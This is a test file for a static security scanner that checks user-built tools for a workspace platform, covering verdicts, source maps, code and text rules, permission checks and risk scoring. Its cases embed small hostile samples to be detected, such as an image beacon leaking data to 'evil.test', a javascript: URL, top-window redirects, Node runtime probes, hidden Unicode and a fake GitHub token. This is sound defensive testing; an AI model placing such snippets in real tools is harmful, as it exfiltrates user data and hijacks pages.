/**
 * The pure halves of the static checks (lib/tools/checks/): verdicts from
 * findings, the source-map reader, the code and text rules' edges, declared
 * against used, the risk score and the compatibility stage.
 *
 * The corpus suite (tools-checks-corpus) asks "is each attack caught"; this
 * one pins the edges — what must NOT be caught, and where a finding points.
 *
 * Run: pnpm --filter @visvine/web exec node --import tsx --test tests/tools-checks.test.ts
 */
import test from 'node:test'
import assert from 'node:assert/strict'
import { parse } from 'acorn'
import { transform } from 'esbuild'
import {
  blockingFindings,
  decodeFindings,
  dedupeFindings,
  findingLine,
  reportStatus,
  sortFindings,
  stageStatus,
  type CheckFinding,
  type CheckReport,
} from '@/lib/tools/checks/findings'
import { positionLookup } from '@/lib/tools/checks/sourceMap'
import { scanCode } from '@/lib/tools/checks/codeRules'
import { entropy, scanSecrets, scanSourceText, scanStrings } from '@/lib/tools/checks/textRules'
import { declaredVsUsed, riskFindings, riskScore } from '@/lib/tools/checks/usage'
import { compatibilityFindings } from '@/lib/tools/checks/compatibility'
import { runStaticChecks } from '@/lib/tools/checks/analyze'
import { EMPTY_PERIMETER } from '@/lib/tools/perimeter'
import { decodeToolConfig } from '@/lib/tools/registry'
import { parseToolConfig } from '@/lib/tools/config'

const f = (severity: CheckFinding['severity'], rule = 'r'): CheckFinding => ({ rule, severity, message: rule })

async function scanUi(code: string) {
  const out = await transform(code, { loader: 'tsx', jsx: 'automatic', format: 'esm', sourcemap: 'external', sourcefile: 'ui.tsx' })
  const program = parse(out.code, { ecmaVersion: 'latest', sourceType: 'module', locations: true })
  return scanCode({ file: 'ui.tsx', program, locate: positionLookup(out.map) })
}

function scanScript(code: string) {
  return scanCode({ file: 'data.js', program: parse(code, { ecmaVersion: 'latest', sourceType: 'script', locations: true }) })
}

const rules = (findings: readonly CheckFinding[]) => findings.map((x) => x.rule)

// ── verdicts ─────────────────────────────────────────────────────────────────

test('high blocks, medium or low flags, info alone passes', () => {
  assert.equal(stageStatus([]), 'passed')
  assert.equal(stageStatus([f('info')]), 'passed')
  assert.equal(stageStatus([f('low')]), 'flagged')
  assert.equal(stageStatus([f('medium'), f('info')]), 'flagged')
  assert.equal(stageStatus([f('low'), f('high')]), 'blocked')
})

test('a report is as bad as its worst stage, and lists only its highs as blocking', () => {
  const report: CheckReport = {
    compatibility: { stage: 'compatibility', status: 'flagged', findings: [f('low', 'a')], analyzer: 'x', durationMs: 0 },
    security: { stage: 'security', status: 'blocked', findings: [f('high', 'b'), f('medium', 'c')], analyzer: 'x', durationMs: 0 },
  }
  assert.equal(reportStatus(report), 'blocked')
  assert.deepEqual(rules(blockingFindings(report)), ['b'])
})

test('findings sort worst first, then by file and line, and a repeat is said once', () => {
  const sorted = sortFindings([
    { rule: 'x', severity: 'low', message: 'x', file: 'ui.tsx', line: 3 },
    { rule: 'y', severity: 'high', message: 'y', file: 'ui.tsx', line: 9 },
    { rule: 'z', severity: 'high', message: 'z', file: 'data.js', line: 1 },
  ])
  assert.deepEqual(rules(sorted), ['z', 'y', 'x'])
  const twice = { rule: 'a', severity: 'high' as const, message: 'm', file: 'ui.tsx' as const, line: 2 }
  assert.equal(dedupeFindings([twice, { ...twice }]).length, 1)
  assert.equal(findingLine(twice), 'ui.tsx:2 — m')
  assert.equal(findingLine({ rule: 'a', severity: 'info', message: 'm' }), 'm')
})

test('a stored findings column is read defensively', () => {
  assert.deepEqual(decodeFindings(null), [])
  assert.deepEqual(decodeFindings([{ rule: 'a', severity: 'bogus', message: 'x' }, 7, { rule: 'b', severity: 'low', message: 'y', file: 'evil.sh', line: 2 }]), [
    { rule: 'b', severity: 'low', message: 'y', line: 2 },
  ])
})

// ── source maps ──────────────────────────────────────────────────────────────

test("a finding in ui.tsx points at the author's own line, after types and JSX are gone", async () => {
  const scan = await scanUi(
    [
      "import { useState } from 'react'",
      'type Props = { a: number }',
      'interface Big { b: string; c: string }',
      '',
      'export default function App(_p: Props) {',
      '  const [n] = useState<number>(0)',
      '  return <div>{n}<p onClick={() => { document.cookie = "x" }} /></div>',
      '}',
    ].join('\n'),
  )
  const cookie = scan.findings.find((x) => x.rule === 'escape.cookie')
  assert.equal(cookie?.line, 7)
})

test('an unreadable map answers null rather than a wrong line', () => {
  assert.equal(positionLookup('not json')(1, 0), null)
  assert.equal(positionLookup(JSON.stringify({ mappings: '' }))(1, 0), null)
})

// ── code rules: what is NOT caught ───────────────────────────────────────────

test("an author's own `parent`, `top`, `open`, `location` and `fetch` are theirs", async () => {
  const scan = await scanUi(`
    const top = 4
    function fetch(rows: string[]) { return rows }
    function Tree({ parent, open }: { parent: { id: string }; open: boolean }) {
      const location = parent.id
      return <p style={{ top }}>{open ? location : ''}{fetch([]).length}</p>
    }
    export default function App() { return <Tree parent={{ id: 'x' }} open /> }
  `)
  assert.deepEqual(scan.findings, [])
})

test('reading the window is not reaching out of it', async () => {
  const scan = await scanUi(`
    export default function App() {
      const w = window.innerWidth
      window.addEventListener('resize', () => {})
      const q = new URLSearchParams(location.search)
      return <p>{w}{q.get('a')}</p>
    }
  `)
  assert.deepEqual(scan.findings, [])
})

test('a literal computed name is read as the name; a computed one is itself the finding', async () => {
  assert.ok(rules((await scanUi(`window['fetch']('/x')`)).findings).includes('exfil.network'))
  assert.ok(rules((await scanUi(`const k = 'to' + 'p'; window[k]`)).findings).includes('obfuscation.computed-global'))
  assert.ok(rules((await scanUi(`globalThis['top'].location.href = '/'`)).findings).includes('escape.other-window'))
})

test('the bridge calls are read with their literal arguments, wherever the client lives', async () => {
  const scan = await scanUi(`
    import { usePagedList, useVisvine } from '@visvine/tool-kit'
    export default function App() {
      const v = useVisvine()
      const path = 'x'
      void v.context.read('deals/a.md'); void v.context.write(path, ''); void v.connectors.call('hubspot', 'x')
      usePagedList('deals/**')
      return null
    }
  `)
  assert.deepEqual(
    scan.calls.map((c) => `${c.method}(${c.arg})`),
    ['context.read(deals/a.md)', 'context.write(null)', 'connectors.call(hubspot)', 'context.list(deals/**)'],
  )
  const data = scanScript(`handlers.sum = async (a, visvine) => visvine.context.list('reports/**')\nhandlers['other'] = () => 1`)
  assert.deepEqual(data.handlers, ['sum', 'other'])
  assert.deepEqual(data.calls.map((c) => c.method), ['context.list'])
})

test("data.js reaching for Node or a connector's isolate is a probe", () => {
  for (const code of ['require("fs")', 'process.env.X', 'sql("select 1")', 'mcp.call()', 'Buffer.from("x")']) {
    assert.ok(rules(scanScript(code).findings).includes('escape.runtime-probe'), code)
  }
})

test('JSX elements that navigate, nest documents or ask for credentials', async () => {
  const scan = await scanUi(`
    export default function App({ d }: { d: string }) {
      return <>
        <a href="javascript:alert(1)">x</a>
        <a target="_top" href="/x">y</a>
        <img src={'https://evil.test/' + d} />
        <input autoComplete="current-password" />
        <form action="/x" />
        <object data="x" />
      </>
    }
  `)
  const found = rules(scan.findings)
  for (const rule of ['escape.javascript-url', 'escape.link-target', 'exfil.beacon', 'phishing.credential-autocomplete', 'escape.form-action', 'escape.forbidden-element']) {
    assert.ok(found.includes(rule), `${rule} missing from ${found.join(', ')}`)
  }
})

// ── text rules ───────────────────────────────────────────────────────────────

test('a BOM at the start is an editor habit; anywhere else an invisible character is hiding something', () => {
  assert.deepEqual(scanSourceText('﻿export default 1', 'ui.tsx'), [])
  assert.deepEqual(rules(scanSourceText('const a​ = 1', 'ui.tsx')), ['obfuscation.invisible'])
  // In the prose of index.md a bidi control is flagged, not blocked.
  assert.equal(scanSourceText('a ‮ b', 'index.md')[0]?.severity, 'medium')
})

test('an escape inside a string is not an escaped name', () => {
  assert.deepEqual(scanSourceText(`const s = 'caf\\u00e9'`, 'ui.tsx'), [])
  assert.deepEqual(rules(scanSourceText(`const r = \\u0065val('1')`, 'ui.tsx')), ['obfuscation.escaped-identifier'])
})

test('a long SVG path is not minified code; a dense one-liner is', () => {
  const path = `const d = "M0 0 ${'L1 2 '.repeat(300)}"`
  assert.deepEqual(scanSourceText(path, 'ui.tsx'), [])
  const minified = Array.from({ length: 40 }, (_, i) => `let a${i}=0;if(a${i}){a${i}++};`).join('')
  assert.deepEqual(rules(scanSourceText(minified, 'ui.tsx')), ['obfuscation.minified'])
})

test('a secret is named by kind, masked, and located', () => {
  const key = ['ghp', 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'].join('_')
  const [finding] = scanSecrets(`// line one\nconst token = '${key}'\n`, 'data.js')
  assert.equal(finding.rule, 'secret.github')
  assert.equal(finding.line, 2)
  assert.equal(finding.message.includes(key), false)
  assert.deepEqual(scanSecrets('const x = "not a secret at all"', 'ui.tsx'), [])
})

test('entropy separates random tokens from prose', () => {
  assert.ok(entropy('the quick brown fox jumps over the lazy dog') < 4.5)
  assert.ok(entropy('q8Zr2LmX9vKp4Wt7Ns1Jd6Hf3Gb5Yc0Ae8Ru2Io4Ps6Dq') > 4.8)
  assert.deepEqual(rules(scanStrings([{ value: 'q8Zr2LmX9vKp4Wt7Ns1Jd6Hf3Gb5Yc0Ae8Ru2Io4Ps6Dq' }], 'ui.tsx')), ['obfuscation.high-entropy'])
  // A URL is long and varied, and still just a URL.
  assert.deepEqual(scanStrings([{ value: 'https://example.com/a8Zr2LmX9vKp4Wt7Ns1Jd6Hf3Gb5Yc0Ae8Ru2Io4' }], 'ui.tsx'), [])
})

// ── declared against used ────────────────────────────────────────────────────

const perimeter = { ...EMPTY_PERIMETER, read: ['deals/**'], write: ['deals/**'], connectors: ['hubspot'] }

test('a call outside the perimeter is said before it fails at run time', () => {
  const found = declaredVsUsed(
    perimeter,
    [
      { method: 'context.read', arg: 'people/ceo.md', file: 'ui.tsx', line: 3 },
      { method: 'context.list', arg: 'deals/2026/**', file: 'ui.tsx' },
      { method: 'context.list', arg: 'hr/**', file: 'ui.tsx' },
      { method: 'context.write', arg: 'deals/a.md', file: 'ui.tsx' },
      { method: 'connectors.call', arg: 'slack', file: 'ui.tsx' },
      { method: 'connectors.call', arg: 'hubspot', file: 'ui.tsx' },
      { method: 'data.call', arg: 'missing', file: 'ui.tsx' },
      { method: 'context.read', arg: null, file: 'ui.tsx' },
    ],
    ['present'],
  )
  assert.deepEqual(
    found.map((x) => `${x.rule}${x.line ? `@${x.line}` : ''}`),
    ['usage.undeclared-read@3', 'usage.undeclared-read', 'usage.undeclared-connector', 'usage.missing-handler'],
  )
})

test('reach it never uses is said at low severity; a call it cannot read is never guessed at', () => {
  const unused = declaredVsUsed({ ...perimeter, agents: ['digest'] }, [{ method: 'context.read', arg: null, file: 'ui.tsx' }], null)
  assert.deepEqual(rules(unused), ['usage.unused-write', 'usage.unused-connector', 'usage.unused-agent'])
  assert.ok(unused.every((x) => x.severity === 'low'))
  // Declaring an agent to CREATE its brief is a write, not a run.
  const briefs = declaredVsUsed(
    { ...EMPTY_PERIMETER, write: ['agents/**'], agents: ['digest-*'] },
    [{ method: 'context.write', arg: 'agents/digest-weekly/index.md', file: 'ui.tsx' }],
    null,
  )
  assert.deepEqual(briefs, [])
})

// ── risk ─────────────────────────────────────────────────────────────────────

test('the risk score reads the laundering and the way out, and flags only when high', () => {
  const surfaces = { rail: null, types: [] }
  const narrow = riskScore({ perimeter, surfaces })
  assert.equal(narrow.level, 'low')
  assert.deepEqual(riskFindings(narrow), [])
  const launder = riskScore({ perimeter: { ...EMPTY_PERIMETER, read: ['**'], write: ['shared/**'] }, surfaces })
  assert.equal(launder.level, 'high')
  assert.equal(riskFindings(launder)[0].severity, 'medium')
  const config = riskScore({ perimeter: { ...EMPTY_PERIMETER, read: ['connectors/*'] }, surfaces })
  assert.ok(config.factors.some((x) => x.startsWith('reads configuration')))
  assert.equal(riskFindings(config)[0]?.severity ?? 'none', 'none')
})

// ── compatibility ────────────────────────────────────────────────────────────

test('compatibility blocks what cannot run and advises the rest', () => {
  const config = decodeToolConfig({ title: 'x', perimeter: { write: ['agents/**'] }, surfaces: { types: [{ type: 'deal', mode: 'page' }] } }, 'x')
  const found = compatibilityFindings({
    build: {
      ok: false,
      errors: [{ file: 'ui.tsx', message: 'Expected ">"', line: 4 }],
      warnings: [{ file: 'ui.tsx', message: '100vh measures the frame', line: 9 }],
      configError: null,
    },
    config,
    hasUi: true,
    facts: { customTypes: [], missing: ['No connector in this space matches hubspot'] },
  })
  assert.deepEqual(
    found.map((x) => `${x.severity} ${x.rule}`),
    [
      'high compat.compile',
      'low compat.design',
      'low compat.description',
      'low compat.inert-agent-write',
      'low compat.page-downgrade',
      'info compat.requirement',
    ],
  )
  assert.deepEqual(
    rules(compatibilityFindings({ build: { ok: true, errors: [], warnings: [], configError: 'bad' }, config: null, hasUi: false })),
    ['compat.config', 'compat.no-ui'],
  )
})

test('both stages run in well under a second on a real tool', async () => {
  const started = performance.now()
  const report = await runStaticChecks({
    index: '---\ntype: tool\ntitle: X\n---\n',
    ui: `export default function App() { return <p>{'x'.repeat(3)}</p> }\n`.repeat(40),
    data: 'handlers.a = async () => 1\n',
    config: decodeToolConfig({ title: 'X' }, 'x'),
    build: { ok: true, errors: [], warnings: [], configError: null },
  })
  assert.ok(performance.now() - started < 1000)
  assert.equal(report.security.analyzer, 'static-2')
})

// ── manifest 2 ──

function v2(permissions: Record<string, unknown>, extra: Record<string, unknown> = {}) {
  const parsed = parseToolConfig({ type: 'tool', title: 'X', description: 'x', permissions, ...extra }, 'x')
  assert.ok(parsed.ok, parsed.ok ? '' : parsed.error)
  return parsed.config
}

test('using a family the manifest never declared is said before anyone installs it', async () => {
  const report = await runStaticChecks({
    index: '---\ntype: tool\n---\n',
    ui: `import { useVisvine } from '@visvine/tool-kit'
export default function App() {
  const v = useVisvine()
  void v.records.query('Deal'); void v.resources.list(); void v.ai.complete('x'); void v.actions.run('read_context'); void v.ui.download({ filename: 'a', content: '' })
  return null
}`,
    data: null,
    config: v2({ context: { read: ['deals/**'] } }),
    build: { ok: true, errors: [], warnings: [], configError: null },
  })
  const found = rules(report.security.findings)
  for (const rule of ['usage.undeclared-records', 'usage.undeclared-resources', 'usage.undeclared-ai', 'usage.unknown-action', 'usage.undeclared-download']) {
    assert.ok(found.includes(rule), `${rule} in ${found.join(', ')}`)
  }
})

test('a module is scanned as ui.tsx is', async () => {
  const report = await runStaticChecks({
    index: '---\ntype: tool\n---\n',
    ui: `import { A } from './src/a'\nexport default function App() { return <A /> }`,
    data: null,
    modules: { 'src/a.tsx': `export function A() { window.top!.location.href = 'https://evil.example'; return null }` },
    config: v2({}),
    build: { ok: true, errors: [], warnings: [], configError: null },
  })
  assert.ok(report.security.findings.some((x) => x.file === 'src/a.tsx' && x.severity === 'high'), JSON.stringify(report.security.findings))
})

test('an action no tool may run, or a package the server does not serve, blocks the publish', () => {
  const config = v2({ actions: ['read_context', 'list_events'] }, { dependencies: { lodash: '^4', zod: '^4' } })
  const found = compatibilityFindings({ build: { ok: true, errors: [], warnings: [], configError: null }, config, hasUi: true })
  const blocking = found.filter((x) => x.severity === 'high').map((x) => x.rule)
  assert.deepEqual(blocking.sort(), ['compat.action', 'compat.dependency'])
  assert.ok(!rules(found).includes('compat.empty-perimeter'), 'actions are reach')
})

test('manifest 2 reach raises the risk the way the v1 lists do', () => {
  const config = v2({ context: { read: ['**'], write: ['deals/**'] }, records: { write: [{ type: 'Deal', fields: ['stage'] }] }, ai: { complete: true }, ui: { download: true } })
  const risk = riskScore(config)
  assert.equal(risk.level, 'high')
  assert.ok(risk.factors.some((line) => line.includes('writes what the space’s AI answers')))
  assert.ok(risk.factors.some((line) => line.includes('as files')))
})

test('the kit components that read and add files count as the Tool reading and adding them', async () => {
  const report = await runStaticChecks({
    index: '---\ntype: tool\n---\n',
    ui: `import { ImageUpload, ResourceImage } from '@visvine/tool-kit'
export default function App() { return <div><ResourceImage id={null} alt="A" /><ImageUpload label="Logo" value={null} onChange={() => {}} /></div> }`,
    data: null,
    config: v2({ resources: { read: ['resources/logos/**'], write: ['resources/logos/**'] } }),
    build: { ok: true, errors: [], warnings: [], configError: null },
  })
  const found = rules(report.security.findings)
  assert.ok(!found.includes('usage.unused-resources'), found.join(', '))
  assert.ok(!found.includes('usage.unused-resource-writes'), found.join(', '))
  const undeclared = await runStaticChecks({
    index: '---\ntype: tool\n---\n',
    ui: `import { ImageUpload } from '@visvine/tool-kit'
export default function App() { return <ImageUpload label="Logo" value={null} onChange={() => {}} /> }`,
    data: null,
    config: v2({}),
    build: { ok: true, errors: [], warnings: [], configError: null },
  })
  assert.ok(rules(undeclared.security.findings).includes('usage.undeclared-resource-writes'))
})
